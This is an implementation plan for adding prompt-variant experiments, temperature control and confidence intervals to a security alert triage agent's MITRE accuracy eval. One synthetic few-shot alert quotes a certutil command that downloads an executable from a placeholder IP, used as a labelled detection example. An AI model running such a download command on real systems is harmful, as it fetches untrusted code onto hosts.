# MITRE-Accuracy Showcase Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a controlled, documented experiment harness to lift (and honestly measure) MITRE technique accuracy, demonstrating eval-driven iteration.

**Architecture:** Turn three constants into parameters — the system prompt (`PromptOptions` → `build_system_prompt`), the sampling `temperature`, and the eval's confidence reporting (Wilson intervals). Add an experiment runner + CLI command that runs the existing eval per prompt variant. All new code is offline-tested; only the human-run experiments cost money.

**Tech Stack:** Python 3.12, Pydantic v2, anthropic SDK, Typer, pytest (offline/mocked), ruff, mypy --strict.

**Conventions for every task:** run `ruff check .`, `ruff format .`, and `mypy` before each commit; they must be clean. Tests run with `.venv\Scripts\python.exe -m pytest`. Commit messages end with the `Co-Authored-By` trailer the repo already uses.

---

### Task 1: Wilson confidence intervals in the eval

**Files:**
- Modify: `src/triagemcp/eval/metrics.py`
- Test: `tests/test_eval.py`

- [ ] **Step 1: Write failing tests** — append to `tests/test_eval.py`:

```python
def test_wilson_interval_known_values() -> None:
    from triagemcp.eval.metrics import wilson_interval

    low, high = wilson_interval(25, 38)
    assert low == pytest.approx(0.499, abs=0.01)
    assert high == pytest.approx(0.788, abs=0.01)


def test_wilson_interval_edges() -> None:
    from triagemcp.eval.metrics import wilson_interval

    assert wilson_interval(0, 0) == (0.0, 0.0)
    assert wilson_interval(38, 38)[1] == pytest.approx(1.0, abs=0.001)


def test_score_reports_confidence_intervals() -> None:
    outcomes = [
        TriageOutcome.success(
            _result("A1", Severity.HIGH, "T1059.001", RecommendedAction.CONTAIN),
            iterations=1,
            latency_ms=1.0,
        )
    ]
    labels = {"A1": _label(Severity.HIGH, "T1059.001", RecommendedAction.CONTAIN)}
    report = score(outcomes, labels, TACTIC)
    assert report.mitre_technique_ci[0] <= report.mitre_technique_accuracy <= report.mitre_technique_ci[1]
    assert report.severity_exact_ci[1] <= 1.0
```

- [ ] **Step 2: Run to verify failure**

Run: `.venv\Scripts\python.exe -m pytest tests/test_eval.py -k "wilson or confidence" -q`
Expected: FAIL (`cannot import name 'wilson_interval'`, and `EvalReport` has no `mitre_technique_ci`).

- [ ] **Step 3: Implement** — in `src/triagemcp/eval/metrics.py`, add the function above the `EvalReport` class:

```python
def wilson_interval(successes: int, n: int, z: float = 1.96) -> tuple[float, float]:
    """95% Wilson score interval for a binomial proportion (analytic, no sampling)."""
    if n == 0:
        return (0.0, 0.0)
    phat = successes / n
    denom = 1.0 + z**2 / n
    center = (phat + z**2 / (2 * n)) / denom
    margin = z * ((phat * (1 - phat) / n + z**2 / (4 * n**2)) ** 0.5) / denom
    return (max(0.0, center - margin), min(1.0, center + margin))
```

Add three fields to `EvalReport` (after `mean_confidence`):

```python
    severity_exact_ci: tuple[float, float] = (0.0, 0.0)
    mitre_technique_ci: tuple[float, float] = (0.0, 0.0)
    action_ci: tuple[float, float] = (0.0, 0.0)
```

Refactor `score()` to keep success counts and set the CIs. Replace the metric block so it reads:

```python
    sev_exact_n = sum(pred.severity == lab.severity for pred, lab in pairs)
    tech_n = sum(pred.mitre_technique_id == lab.mitre_technique_id for pred, lab in pairs)
    action_n = sum(pred.recommended_action == lab.recommended_action for pred, lab in pairs)
    sev_exact = sev_exact_n / scored
    sev_within = sum(pred.severity.distance(lab.severity) <= 1 for pred, lab in pairs) / scored
    technique = tech_n / scored
    tactic = (
        sum(
            _tactic(tactic_by_id, pred.mitre_technique_id)
            == _tactic(tactic_by_id, lab.mitre_technique_id)
            for pred, lab in pairs
        )
        / scored
    )
    action = action_n / scored
    mean_conf = sum(pred.confidence for pred, _ in pairs) / scored
    overall = (sev_exact + technique + action) / 3
```

And add to the final `EvalReport(...)` return:

```python
        severity_exact_ci=wilson_interval(sev_exact_n, scored),
        mitre_technique_ci=wilson_interval(tech_n, scored),
        action_ci=wilson_interval(action_n, scored),
```

- [ ] **Step 4: Run to verify pass**

Run: `.venv\Scripts\python.exe -m pytest tests/test_eval.py -q` → all pass.
Run: `ruff check . ; ruff format . ; mypy` → clean.

- [ ] **Step 5: Commit**

```bash
git add src/triagemcp/eval/metrics.py tests/test_eval.py
git commit -m "Add Wilson confidence intervals to the eval report"
```

---

### Task 2: Temperature control through the LLM seam

**Files:**
- Modify: `src/triagemcp/agent/llm.py`, `src/triagemcp/testing.py`, `src/triagemcp/agent/loop.py`
- Test: `tests/test_agent_loop.py`

- [ ] **Step 1: Write failing test** — append to `tests/test_agent_loop.py`:

```python
async def test_temperature_is_passed_to_the_client() -> None:
    client = FakeLLMClient([submit(_valid_args())])
    agent = TriageAgent(client, _registry(), AgentConfig(temperature=0.0), sleep=_noop_sleep)
    await agent.triage(_alert())
    assert client.last_temperature == 0.0
```

- [ ] **Step 2: Run to verify failure**

Run: `.venv\Scripts\python.exe -m pytest tests/test_agent_loop.py -k temperature -q`
Expected: FAIL (`AgentConfig` has no `temperature`; `FakeLLMClient` has no `last_temperature`).

- [ ] **Step 3: Implement.**

In `src/triagemcp/agent/llm.py`, add `temperature: float = 0.0` (keyword-only) to BOTH the `LLMClient.create` protocol signature and `AnthropicLLMClient.create`, and pass it to the SDK call:

```python
    async def create(
        self,
        *,
        system: str,
        messages: Sequence[dict[str, Any]],
        tools: Sequence[dict[str, Any]],
        model: str,
        max_tokens: int,
        temperature: float = 0.0,
    ) -> AssistantTurn: ...
```

```python
            message = await self._client.messages.create(
                model=model,
                max_tokens=max_tokens,
                temperature=temperature,
                system=system,
                tools=cast("Any", list(tools)),
                messages=cast("Any", list(messages)),
            )
```

In `src/triagemcp/testing.py`, add the param to `FakeLLMClient`, record it, and initialise it in `__init__`:

```python
        self.last_temperature: float | None = None
```

```python
    async def create(
        self,
        *,
        system: str,
        messages: Sequence[dict[str, Any]],
        tools: Sequence[dict[str, Any]],
        model: str,
        max_tokens: int,
        temperature: float = 0.0,
    ) -> AssistantTurn:
        self.calls += 1
        self.seen_tools = [str(tool["name"]) for tool in tools]
        self.last_temperature = temperature
        if self._delay:
            await asyncio.sleep(self._delay)
        if not self._script:
            raise AssertionError("FakeLLMClient exhausted its scripted turns")
        item = self._script.pop(0)
        if isinstance(item, Exception):
            raise item
        return item
```

In `src/triagemcp/agent/loop.py`, add `temperature: float = 0.0` to `AgentConfig`, and pass it in `_create_with_retry`'s `operation`:

```python
            return await self._llm.create(
                system=self._config.system_prompt,
                messages=messages,
                tools=self._tool_specs,
                model=self._config.model,
                max_tokens=self._config.max_tokens,
                temperature=self._config.temperature,
            )
```

(Note: `system=self._config.system_prompt` depends on Task 3; for this task use `system=SYSTEM_PROMPT` and switch it in Task 3.)

- [ ] **Step 4: Run to verify pass**

Run: `.venv\Scripts\python.exe -m pytest -q` → all pass.
Run: `ruff check . ; ruff format . ; mypy` → clean.

- [ ] **Step 5: Commit**

```bash
git add src/triagemcp/agent/llm.py src/triagemcp/testing.py src/triagemcp/agent/loop.py tests/test_agent_loop.py
git commit -m "Thread sampling temperature through the LLM seam (default 0.0)"
```

---

### Task 3: Parameterized system prompt + technique catalog

**Files:**
- Modify: `src/triagemcp/agent/prompts.py`, `src/triagemcp/agent/loop.py`
- Test: `tests/test_prompts.py` (new)

- [ ] **Step 1: Write failing tests** — create `tests/test_prompts.py`:

```python
"""Spec for composable system-prompt variants."""

from __future__ import annotations

from triagemcp.agent.prompts import PromptOptions, build_system_prompt


def test_baseline_prompt_has_no_catalog() -> None:
    prompt = build_system_prompt(PromptOptions())
    assert "T1059.001" not in prompt
    assert "submit_triage" in prompt


def test_catalog_option_lists_known_techniques() -> None:
    prompt = build_system_prompt(PromptOptions(include_technique_catalog=True))
    assert "T1059.001" in prompt
    assert "Brute Force" in prompt


def test_require_mapping_option_adds_instruction() -> None:
    prompt = build_system_prompt(PromptOptions(require_map_to_mitre=True))
    assert "map_to_mitre" in prompt
    assert "must" in prompt.lower()


def test_module_constant_equals_baseline() -> None:
    from triagemcp.agent.prompts import SYSTEM_PROMPT

    assert SYSTEM_PROMPT == build_system_prompt(PromptOptions())
```

- [ ] **Step 2: Run to verify failure**

Run: `.venv\Scripts\python.exe -m pytest tests/test_prompts.py -q`
Expected: FAIL (`cannot import name 'PromptOptions'`).

- [ ] **Step 3: Implement** — in `src/triagemcp/agent/prompts.py`:

Add imports at top: `from dataclasses import dataclass` and `from triagemcp.tools.mitre import load_mitre_techniques`.

Rename the existing `SYSTEM_PROMPT = """..."""` literal to `_BASE_PROMPT = """..."""` (keep the exact text). Then add:

```python
@dataclass(frozen=True)
class PromptOptions:
    """Toggles for composing a system-prompt variant (one knob per experiment)."""

    include_technique_catalog: bool = False
    require_map_to_mitre: bool = False
    include_few_shot: bool = False


_REQUIRE_MAPPING_TEXT = (
    "Before submitting, you MUST call map_to_mitre on the alert text and weigh its ranked "
    "suggestions when choosing mitre_technique_id."
)


def _render_technique_catalog() -> str:
    lines = [
        f"- {t.id} {t.name} ({t.tactic})" for t in load_mitre_techniques()
    ]
    return "Known MITRE ATT&CK techniques (choose mitre_technique_id from this set):\n" + "\n".join(
        lines
    )


def build_system_prompt(options: PromptOptions | None = None) -> str:
    """Compose the system prompt for a given experiment variant."""
    options = options or PromptOptions()
    parts = [_BASE_PROMPT]
    if options.include_technique_catalog:
        parts.append(_render_technique_catalog())
    if options.require_map_to_mitre:
        parts.append(_REQUIRE_MAPPING_TEXT)
    if options.include_few_shot:
        parts.append(_render_few_shot())  # defined in Task 4
    return "\n\n".join(parts)


SYSTEM_PROMPT = build_system_prompt()
```

NOTE: `_render_few_shot` does not exist until Task 4. For THIS task, temporarily make the few-shot branch a no-op by replacing that line with `parts.append("")` and a `# few-shot added in Task 4` comment; Task 4 swaps it in. (Keeps the task self-contained and green.)

In `src/triagemcp/agent/loop.py`, add the field to `AgentConfig` (after `model`):

```python
    system_prompt: str = SYSTEM_PROMPT
```

and switch the loop to use it (the `operation` in `_create_with_retry`): `system=self._config.system_prompt`.

- [ ] **Step 4: Run to verify pass**

Run: `.venv\Scripts\python.exe -m pytest -q` → all pass.
Run: `ruff check . ; ruff format . ; mypy` → clean.

- [ ] **Step 5: Commit**

```bash
git add src/triagemcp/agent/prompts.py src/triagemcp/agent/loop.py tests/test_prompts.py
git commit -m "Add composable system-prompt variants + technique-catalog option"
```

---

### Task 4: Synthetic few-shot examples + leakage guard

**Files:**
- Modify: `src/triagemcp/agent/prompts.py`
- Test: `tests/test_prompts.py`, `tests/test_datasets.py`

- [ ] **Step 1: Write failing tests.**

In `tests/test_prompts.py`:

```python
def test_few_shot_option_includes_a_worked_example() -> None:
    prompt = build_system_prompt(PromptOptions(include_few_shot=True))
    assert "Worked example" in prompt
    assert "FEWSHOT-" in prompt
```

In `tests/test_datasets.py`:

```python
def test_few_shot_examples_do_not_leak_into_eval_set() -> None:
    from triagemcp.agent.prompts import FEW_SHOT_EXAMPLES

    eval_ids = {labeled.alert.id for labeled in load_sample_alerts()}
    eval_titles = {labeled.alert.title for labeled in load_sample_alerts()}
    for example in FEW_SHOT_EXAMPLES:
        assert example.alert_id not in eval_ids
        assert example.title not in eval_titles
```

- [ ] **Step 2: Run to verify failure**

Run: `.venv\Scripts\python.exe -m pytest tests/test_prompts.py tests/test_datasets.py -k "few_shot or leak" -q`
Expected: FAIL (`FEW_SHOT_EXAMPLES` / `_render_few_shot` undefined).

- [ ] **Step 3: Implement** — in `src/triagemcp/agent/prompts.py` add (and replace the Task-3 no-op `parts.append("")` with `parts.append(_render_few_shot())`):

```python
@dataclass(frozen=True)
class FewShotExample:
    alert_id: str
    title: str
    alert_text: str
    verdict: str


FEW_SHOT_EXAMPLES: tuple[FewShotExample, ...] = (
    FewShotExample(
        alert_id="FEWSHOT-1",
        title="certutil downloading a remote executable",
        alert_text="certutil.exe -urlcache -split -f http://203.0.113.8/b.exe b.exe on HR-WS-02.",
        verdict=(
            "severity=high, mitre_technique_id=T1105 (Ingress Tool Transfer), "
            "recommended_action=contain, confidence=0.9 — certutil is a LOLBin used to "
            "download a remote payload."
        ),
    ),
    FewShotExample(
        alert_id="FEWSHOT-2",
        title="Authorized vulnerability scanner tripping IDS",
        alert_text="Hundreds of exploit signatures, all sourced from the approved scanner 10.0.0.5.",
        verdict=(
            "severity=informational, mitre_technique_id=T1046 (Network Service Discovery), "
            "recommended_action=close_false_positive, confidence=0.85 — known authorized scanner."
        ),
    ),
)


def _render_few_shot() -> str:
    blocks = [
        f"Worked example ({ex.alert_id}):\nAlert: {ex.alert_text}\nVerdict: {ex.verdict}"
        for ex in FEW_SHOT_EXAMPLES
    ]
    return "\n\n".join(blocks)
```

- [ ] **Step 4: Run to verify pass**

Run: `.venv\Scripts\python.exe -m pytest -q` → all pass.
Run: `ruff check . ; ruff format . ; mypy` → clean.

- [ ] **Step 5: Commit**

```bash
git add src/triagemcp/agent/prompts.py tests/test_prompts.py tests/test_datasets.py
git commit -m "Add synthetic few-shot examples with a leakage guard"
```

---

### Task 5: build_runtime overrides + experiment runner

**Files:**
- Modify: `src/triagemcp/server.py`
- Create: `src/triagemcp/eval/experiments.py`
- Test: `tests/test_experiments.py` (new)

- [ ] **Step 1: Write failing test** — create `tests/test_experiments.py`:

```python
"""Spec for the experiment runner (offline; fake triager via patched build_runtime)."""

from __future__ import annotations

import contextlib
from collections.abc import AsyncIterator

import pytest

from triagemcp.agent.loop import AgentRun
from triagemcp.config import Settings
from triagemcp.eval.experiments import PROMPT_VARIANTS, run_experiment
from triagemcp.models import Alert, RecommendedAction, Severity, TriageResult


class _LabelEchoTriager:
    def __init__(self, labels: dict[str, object]) -> None:
        self._labels = labels

    async def run(self, alert: Alert) -> AgentRun:
        lab = self._labels[alert.id]
        result = TriageResult(
            alert_id=alert.id,
            severity=lab.severity,  # type: ignore[attr-defined]
            confidence=0.9,
            mitre_technique_id=lab.mitre_technique_id,  # type: ignore[attr-defined]
            mitre_technique_name="x",
            recommended_action=lab.recommended_action,  # type: ignore[attr-defined]
            rationale="echo",
        )
        return AgentRun(result=result, iterations=1)


def test_prompt_variants_cover_the_ladder() -> None:
    assert set(PROMPT_VARIANTS) == {"baseline", "catalog", "catalog+map", "catalog+map+fewshot"}


async def test_run_experiment_scores_against_labels(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-test")
    from triagemcp.datasets import load_sample_alerts

    labels = {la.alert.id: la.label for la in load_sample_alerts()}

    @contextlib.asynccontextmanager
    async def _fake_runtime(_settings: Settings, **_kwargs: object) -> AsyncIterator[_LabelEchoTriager]:
        yield _LabelEchoTriager(labels)

    monkeypatch.setattr("triagemcp.eval.experiments.build_runtime", _fake_runtime)
    report = await run_experiment("catalog", settings=Settings(), model="claude-haiku-4-5", concurrency=2)
    assert report.scored == len(labels)
    assert report.mitre_technique_accuracy == pytest.approx(1.0)
```

- [ ] **Step 2: Run to verify failure**

Run: `.venv\Scripts\python.exe -m pytest tests/test_experiments.py -q`
Expected: FAIL (`No module named 'triagemcp.eval.experiments'`).

- [ ] **Step 3: Implement.**

First, give `build_runtime` overrides in `src/triagemcp/server.py` — change its signature and the `AgentConfig` it builds:

```python
@contextlib.asynccontextmanager
async def build_runtime(
    settings: Settings,
    *,
    model: str | None = None,
    system_prompt: str | None = None,
    temperature: float = 0.0,
) -> AsyncIterator[TriageAgent]:
    anthropic_client = AsyncAnthropic(api_key=settings.anthropic_api_key.get_secret_value())
    conn = await aiosqlite.connect(settings.db_path)
    try:
        registry = await build_default_registry(conn)
        config = AgentConfig(
            model=model or settings.model,
            max_tokens=settings.max_tokens,
            max_iterations=settings.max_iterations,
            per_alert_timeout_s=settings.per_alert_timeout_s,
            max_retries=settings.max_retries,
            temperature=temperature,
        )
        if system_prompt is not None:
            config = replace(config, system_prompt=system_prompt)
        agent = TriageAgent(AnthropicLLMClient(anthropic_client), registry, config)
        yield agent
    finally:
        await conn.close()
        await anthropic_client.close()
```

Add `from dataclasses import replace` to `server.py` imports.

Then create `src/triagemcp/eval/experiments.py`:

```python
"""Run the eval over the labeled set for a named system-prompt variant."""

from __future__ import annotations

from triagemcp.agent.prompts import PromptOptions, build_system_prompt
from triagemcp.config import Settings
from triagemcp.datasets import load_sample_alerts
from triagemcp.eval.harness import run_eval
from triagemcp.eval.metrics import EvalReport
from triagemcp.server import build_runtime
from triagemcp.tools.mitre import load_mitre_techniques

PROMPT_VARIANTS: dict[str, PromptOptions] = {
    "baseline": PromptOptions(),
    "catalog": PromptOptions(include_technique_catalog=True),
    "catalog+map": PromptOptions(include_technique_catalog=True, require_map_to_mitre=True),
    "catalog+map+fewshot": PromptOptions(
        include_technique_catalog=True, require_map_to_mitre=True, include_few_shot=True
    ),
}


async def run_experiment(
    variant: str, *, settings: Settings, model: str, concurrency: int
) -> EvalReport:
    """Triage the labeled set with the given prompt variant and score the result."""
    if variant not in PROMPT_VARIANTS:
        raise ValueError(f"unknown variant {variant!r}; choose from {sorted(PROMPT_VARIANTS)}")
    labeled = load_sample_alerts()
    tactic_by_id = {t.id: t.tactic for t in load_mitre_techniques()}
    system_prompt = build_system_prompt(PROMPT_VARIANTS[variant])
    async with build_runtime(
        settings, model=model, system_prompt=system_prompt, temperature=0.0
    ) as triager:
        return await run_eval(
            labeled, triager, concurrency=concurrency, tactic_by_id=tactic_by_id
        )
```

- [ ] **Step 4: Run to verify pass**

Run: `.venv\Scripts\python.exe -m pytest -q` → all pass.
Run: `ruff check . ; ruff format . ; mypy` → clean.

- [ ] **Step 5: Commit**

```bash
git add src/triagemcp/server.py src/triagemcp/eval/experiments.py tests/test_experiments.py
git commit -m "Add experiment runner + build_runtime prompt/model/temperature overrides"
```

---

### Task 6: `triagemcp experiment` CLI command

**Files:**
- Modify: `src/triagemcp/cli.py`
- Test: `tests/test_cli.py`

- [ ] **Step 1: Write failing tests** — append to `tests/test_cli.py`:

```python
def test_experiment_lists_variants_in_help() -> None:
    result = runner.invoke(app, ["experiment", "--help"])
    assert result.exit_code == 0
    assert "variant" in result.output


def test_experiment_without_key_exits(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    result = runner.invoke(app, ["experiment", "--variant", "baseline"])
    assert result.exit_code == 1
    assert "ANTHROPIC_API_KEY" in result.stderr
```

- [ ] **Step 2: Run to verify failure**

Run: `.venv\Scripts\python.exe -m pytest tests/test_cli.py -k experiment -q`
Expected: FAIL (no `experiment` command).

- [ ] **Step 3: Implement** — in `src/triagemcp/cli.py` add imports `from triagemcp.eval.experiments import PROMPT_VARIANTS, run_experiment` and the command:

```python
@app.command()
def experiment(
    variant: Annotated[
        str, typer.Option("--variant", "-v", help="Prompt variant to evaluate.")
    ] = "baseline",
    model: Annotated[str | None, typer.Option("--model", "-m")] = None,
    concurrency: Annotated[int | None, typer.Option("--concurrency", "-c", min=1)] = None,
) -> None:
    """Run the eval for one prompt variant (for the accuracy showcase)."""
    if variant not in PROMPT_VARIANTS:
        _abort(f"Unknown variant {variant!r}. Choose from: {', '.join(sorted(PROMPT_VARIANTS))}.")
    settings = _load_settings(model)
    report = asyncio.run(
        run_experiment(
            variant,
            settings=settings,
            model=settings.model,
            concurrency=concurrency or settings.concurrency,
        )
    )
    console.print(f"[bold]Variant:[/] {variant}  [bold]model:[/] {settings.model}")
    console.print(eval_report_table(report))
    console.print(report.summary_line())
```

- [ ] **Step 4: Run to verify pass**

Run: `.venv\Scripts\python.exe -m pytest -q` → all pass.
Run: `ruff check . ; ruff format . ; mypy` → clean.

- [ ] **Step 5: Commit**

```bash
git add src/triagemcp/cli.py tests/test_cli.py
git commit -m "Add `triagemcp experiment` CLI command"
```

---

### Task 7: Show confidence intervals in the eval table

**Files:**
- Modify: `src/triagemcp/report.py`
- Test: `tests/test_report.py`

- [ ] **Step 1: Write failing test** — append to `tests/test_report.py`:

```python
def test_eval_report_table_shows_mitre_ci() -> None:
    report = EvalReport(
        total=38,
        scored=38,
        errors=0,
        severity_exact_accuracy=0.5,
        severity_within_one_accuracy=1.0,
        mitre_technique_accuracy=0.658,
        mitre_tactic_accuracy=0.737,
        action_accuracy=0.447,
        overall_accuracy=0.535,
        mean_confidence=0.9,
        mitre_technique_ci=(0.50, 0.79),
    )
    out = _render(eval_report_table(report))
    assert "50.0" in out and "79.0" in out
```

- [ ] **Step 2: Run to verify failure**

Run: `.venv\Scripts\python.exe -m pytest tests/test_report.py -k mitre_ci -q`
Expected: FAIL (CI not rendered).

- [ ] **Step 3: Implement** — in `src/triagemcp/report.py`, in `eval_report_table`, change the MITRE technique row to include its CI:

```python
        (
            "MITRE technique",
            f"{report.mitre_technique_accuracy:.1%} [{report.mitre_technique_ci[0]:.1%}"
            f"–{report.mitre_technique_ci[1]:.1%}]",
        ),
```

- [ ] **Step 4: Run to verify pass**

Run: `.venv\Scripts\python.exe -m pytest -q` → all pass.
Run: `ruff check . ; ruff format . ; mypy` → clean.

- [ ] **Step 5: Commit**

```bash
git add src/triagemcp/report.py tests/test_report.py
git commit -m "Render the MITRE technique confidence interval in the eval table"
```

---

### Task 8: Experiment write-up doc + README link

**Files:**
- Create: `docs/experiments/mitre-accuracy.md`
- Modify: `README.md`

- [ ] **Step 1: Create the write-up template** — `docs/experiments/mitre-accuracy.md`:

```markdown
# Experiment log: lifting MITRE technique accuracy

**Method.** Each step changes exactly one thing in the system prompt and re-runs the eval over
the same 38 labeled alerts at temperature 0. We compare on the *same* alerts (paired), counting
how many flipped incorrect→correct vs correct→incorrect on `mitre_technique_id`, and report the
Wilson 95% CI. A change of one or two alerts on 38 is within the CI and is treated as noise.
Iteration is on Haiku (`claude-haiku-4-5`); the final winner is confirmed once on Sonnet.

Reproduce a row with: `triagemcp experiment --variant <name> --model <model>`.

| Step | Variant | Model | Technique acc (95% CI) | Net flips vs prev | Decision | Notes |
|------|---------|-------|------------------------|-------------------|----------|-------|
| E0   | baseline | haiku | _TBD by run_ | — | reference | re-baseline at temp 0 |
| E1   | catalog | haiku | _TBD_ | _TBD_ | _TBD_ | technique list in prompt |
| E2   | catalog+map | haiku | _TBD_ | _TBD_ | _TBD_ | require map_to_mitre |
| E3   | catalog+map+fewshot | haiku | _TBD_ | _TBD_ | _TBD_ | + few-shot |
| Final | winner | sonnet | _TBD_ | vs 54.4% baseline | _TBD_ | confirmation |

**Leakage:** few-shot examples are synthetic (`FEWSHOT-*`), asserted disjoint from the eval set
by `test_few_shot_examples_do_not_leak_into_eval_set`.

_Rows marked TBD are filled by running the experiments with a real key; the table records the
actual outcome, including any negative results._
```

(The `_TBD_` cells are intentionally left for the human-run experiment phase — this is a results
template, not plan placeholders.)

- [ ] **Step 2: Link from the README** — under the `## Eval headline` section in `README.md`, add:

```markdown
See [`docs/experiments/mitre-accuracy.md`](docs/experiments/mitre-accuracy.md) for the
eval-driven iteration log on MITRE technique accuracy.
```

- [ ] **Step 3: Verify build + commit**

Run: `ruff check . ; ruff format --check . ; mypy ; .venv\Scripts\python.exe -m pytest -q` → all clean/pass.

```bash
git add docs/experiments/mitre-accuracy.md README.md
git commit -m "Add MITRE-accuracy experiment write-up and README link"
```

---

### Task 9 (manual, costs money — run by the human): execute the experiments

Not a code task. With `ANTHROPIC_API_KEY` set:

```bash
triagemcp experiment --variant baseline             --model claude-haiku-4-5 --concurrency 2
triagemcp experiment --variant catalog              --model claude-haiku-4-5 --concurrency 2
triagemcp experiment --variant catalog+map          --model claude-haiku-4-5 --concurrency 2
triagemcp experiment --variant catalog+map+fewshot  --model claude-haiku-4-5 --concurrency 2
# confirm the best variant once on Sonnet:
triagemcp experiment --variant <winner> --model claude-sonnet-4-6 --concurrency 2
```

Fill the table in `docs/experiments/mitre-accuracy.md` with the measured technique accuracy + CI
and the keep/discard decision for each step (negatives included), then commit.

---

## Self-Review

**Spec coverage:** harness (prompt variants → T3/T4, temperature → T2, Wilson CI → T1, runner →
T5, CLI → T6, CI rendering → T7), experiment ladder (PROMPT_VARIANTS in T5; executed in T9),
paired-comparison decision rule (documented in the write-up T8/T9), write-up + leakage guard
(T8 + T4), testing offline (every task). All spec sections map to a task.

**Placeholders:** the only `_TBD_` markers are results cells filled during the manual run phase
(T9) — explicitly a template, not missing plan content. All code steps contain complete code.

**Type consistency:** `PromptOptions`, `build_system_prompt`, `FewShotExample`,
`FEW_SHOT_EXAMPLES`, `wilson_interval`, `run_experiment`, `PROMPT_VARIANTS`, and the
`build_runtime(..., model=, system_prompt=, temperature=)` signature are defined once and used
consistently across tasks. `AgentConfig` gains `system_prompt` (T3) and `temperature` (T2);
`FakeLLMClient.last_temperature` (T2) matches its test usage.
